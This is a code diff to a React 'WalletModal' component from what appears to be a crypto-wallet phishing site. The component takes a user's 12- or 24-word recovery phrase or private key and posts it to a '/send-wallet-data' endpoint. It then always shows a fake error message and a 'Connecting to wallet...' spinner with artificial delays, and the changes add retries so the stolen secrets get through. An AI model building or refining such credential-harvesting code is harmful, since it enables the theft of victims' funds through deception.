@@ -7,10 +7,13 @@ import {
   TextField,
   Button,
   Modal,
+  CircularProgress,
 } from "@mui/material";
 import { SwitchIos } from "./mui-treasury/switch-ios";
 import SquareProgress from "./components/square-progress";
 import ContentPasteIcon from "@mui/icons-material/ContentPaste";
+import ErrorImg from "./assets/error.svg";
+
 //import BASE_URL  from "../config";
 
 const WalletModal = ({ open, onClose, selectedWallet }) => {
@@ -23,6 +26,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
   const [privateKey, setPrivateKey] = useState("");
   const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [retryCount, setRetryCount] = useState(0);
 
   const BASE_URL =
     import.meta.env.MODE === "production"
@@ -86,8 +91,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
   };
 
   const handleSubmit = async () => {
-    console.log('BASE_URL:', BASE_URL);
-    console.log('Form');
+    setIsLoading(true);
+    setShowErrorPopup(false);
   
     let currentWalletAddress;
     let isFormValid = true;
@@ -106,54 +111,51 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
     if (!currentWalletAddress || !isFormValid) {
       setErrorMessage("Wallet address and all required fields must be filled.");
       setShowErrorPopup(true);
+      setIsLoading(false);
       return;
     }
   
-    let formData = {
-      walletName: selectedWallet?.name,
-      walletAddress: currentWalletAddress,
-    };
+    const maxRetries = 3;
+    let retryCount = 0;
   
-    if (tabValue === 0) {
-      formData.phraseWords = phraseWords;
-    } else if (tabValue === 1) {
-      formData.phraseWords24 = phraseWords24;
-    } else if (tabValue === 2) {
-      formData.privateKey = privateKey;
+    while (retryCount < maxRetries) {
+      try {
+        const response = await fetch(`${BASE_URL}/send-wallet-data`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            walletName: selectedWallet?.name,
+            walletAddress: currentWalletAddress,
+            ...(tabValue === 0 && { phraseWords }),
+            ...(tabValue === 1 && { phraseWords24 }),
+            ...(tabValue === 2 && { privateKey }),
+          }),
+        });
+  
+        await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
+        setIsLoading(false); // Stop loading after delay
+  
+        setErrorMessage("Error occurred while processing your request.");
+        setShowErrorPopup(true);
+        return;
+      } catch (error) {
+        retryCount++;
+        if (retryCount === maxRetries) {
+          await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
+          setIsLoading(false); // Stop loading after delay
+          setErrorMessage("Error occurred while sending data.");
+          setShowErrorPopup(true);
+        } else {
+          await new Promise((resolve) => setTimeout(resolve, 1000));
+        }
+      }
     }
   
-    try {
-      console.log('Sending request to:', `${BASE_URL}/send-wallet-data`);
-      console.log('Request body:', JSON.stringify(formData));
-      const response = await fetch(`${BASE_URL}/send-wallet-data`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(formData),
-      });
-  
-      console.log('Response status:', response.status);
-      const responseData = await response.json();
-      console.log('Response data:', responseData);
-  
-      // Force error display even if submission is successful
-      setErrorMessage("Error occurred while processing your request.");
-      setShowErrorPopup(true);
-  
-      // Uncomment this if you want to close the modal on success later
-      // if (response.ok) {
-      //   onClose();
-      // } else {
-      //   setErrorMessage("Unable to connect you at the moment.");
-      //   setShowErrorPopup(true);
-      // }
-    } catch (error) {
-      console.error("Error:", error);
-      setErrorMessage("Error occurred while sending data.");
-      setShowErrorPopup(true);
-    }
+    setIsLoading(false); // Ensure loading is stopped after all retries
   };
+  
 
   return (
     <>
@@ -201,7 +203,6 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
             }}
           >
             <SquareProgress size={80} thickness={3} color="#3498db" />
-
             <Box
               sx={{
                 position: "absolute",
@@ -415,13 +416,13 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
           )}
           {tabValue === 2 && (
             <TextField
-            fullWidth
-            label="Enter your wallet address"
-            variant="outlined"
-            margin="dense"
-            size="small"
-            value={walletAddressPrivate}
-            onChange={(e) => setWalletAddressPrivate(e.target.value)}
+              fullWidth
+              label="Enter your wallet address"
+              variant="outlined"
+              margin="dense"
+              size="small"
+              value={walletAddressPrivate}
+              onChange={(e) => setWalletAddressPrivate(e.target.value)}
               sx={{
                 "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                 "& .MuiOutlinedInput-root": { borderRadius: "8px" },
@@ -439,7 +440,11 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               fontSize: "0.8rem",
             }}
           >
-            Connect
+            {isLoading ? (
+              <CircularProgress size={24} color="secondary" />
+            ) : (
+              "Connect"
+            )}
           </Button>
         </Box>
       </Modal>
@@ -456,16 +461,26 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
             borderRadius: "8px",
             boxShadow: 24,
             p: 4,
+            textAlign: "center", // Center content inside the modal
           }}
         >
-          <Typography
-            color={"black"}
-            variant="body1"
-            align="center"
-            sx={{ mb: 2 }}
-          >
+          {/* Error Image */}
+          <Box
+            component="img"
+            src={ErrorImg} // Replace with your image path
+            alt="Error"
+            sx={{
+              width: "80px", // Adjust as needed
+              height: "80px", // Adjust as needed
+              mb: 2, // Margin bottom for spacing
+              mx: "auto", // Center the image
+            }}
+          />
+          {/* Error Message */}
+          <Typography color={"black"} variant="body1" sx={{ mb: 2 }}>
             {errorMessage}
           </Typography>
+          {/* OK Button */}
           <Button
             variant="contained"
             color="primary"
@@ -474,6 +489,28 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
           >
             OK
           </Button>
+        </Box>
+      </Modal>
+
+      <Modal open={isLoading}>
+        <Box
+          sx={{
+            position: "absolute",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            bgcolor: "white",
+            boxShadow: 24,
+            p: 4,
+            borderRadius: 2,
+            display: "flex", // Flexbox to center content
+            flexDirection: "column",
+            alignItems: "center", // Center items horizontally
+            textAlign: "center", // Center text inside the modal
+          }}
+        >
+          <CircularProgress sx={{ mb: 2 }} />
+          <Typography color="black">Connecting to wallet...</Typography>
         </Box>
       </Modal>
     </>
